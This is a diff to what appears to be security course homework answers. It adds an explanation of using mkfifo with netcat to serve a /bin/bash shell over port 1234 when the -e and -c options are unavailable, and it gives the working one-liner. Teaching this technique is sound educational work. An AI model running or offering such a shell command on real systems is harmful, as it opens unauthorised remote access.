@@ -59,6 +59,13 @@ You need to recover stdin on /dev/pts/1, like:  'exec < /dev/pts/1' >&3 for exam
 stdin of the target shell now executes a line that redirects the terminal stdin into fd 0,
 the shell stdin.
 
+7. Explain how to use mkfifo to get a reverse shell with netcat when -e and -c are
+unavailable. You can google this if you like, but be sure and explain how it works.
+First you would 'mkfifo pipe', then you need to direct an instance of /bin/bash into that
+pipe, this would look like: 'cat pipe | /bin/bash 2>&1|nc -l 1234 >pipe'.  The pipe gets
+piped into bash, which redirects its stderr to stdout.  All of that gets pushed into netcat
+which then redirects its stdin to bash's pipe.
+
 8) Write a program that reads 4 unsigned ints sent in host byte order from
 hitchens.cs.colorado.edu port 1234 adds them up, and sends them back to that
 port. (This is a little-endian machine. Recall that "network order" is big-endian.)
